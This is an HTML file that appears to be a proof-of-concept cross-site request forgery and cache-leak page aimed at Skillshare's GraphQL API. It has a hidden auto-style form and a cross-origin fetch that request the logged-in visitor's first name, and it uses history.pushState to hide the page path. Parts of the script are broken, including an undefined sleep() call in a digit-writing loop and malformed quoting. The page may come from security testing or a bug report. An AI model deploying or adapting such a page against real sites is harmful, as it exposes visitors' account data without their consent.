<html>
  
  <script>history.pushState('', '', '/')</script>
    <form action="https://www.skillshare.com/api/graphql">
      <input type="hidden" name="query" value="query viewerContext($isAuthenticated: Boolean!) { viewer @include(if: $isAuthenticated) { firstName } }&variables={"isAuthenticated":true}" />
      <input type="hidden" name="variables" value="{"isAuthenticated":true}" />
      <input type="submit" value="Submit request" />
    </form>
  
        <script type="text/javascript">
         for (var i = 1; i <= 5; i++) {
             document.write(i);
             sleep(2); //for the first time loop is excute and sleep for 2 seconds        
         };
      </script>
  
  
<script>  
var url = "https://www.skillshare.com/api/graphql?query=query%20viewerContext($isAuthenticated:%20Boolean!)%20{%20viewer%20@include(if:%20$isAuthenticated)%20{%20firstName%20}%20}&variables={%22isAuthenticated%22:true}";  
fetch(url, {    
    method: 'GET',    
    cache: 'force-cache'
    })
.then(response => response.json())
.then(data => console.log(data));
</script>


</html>
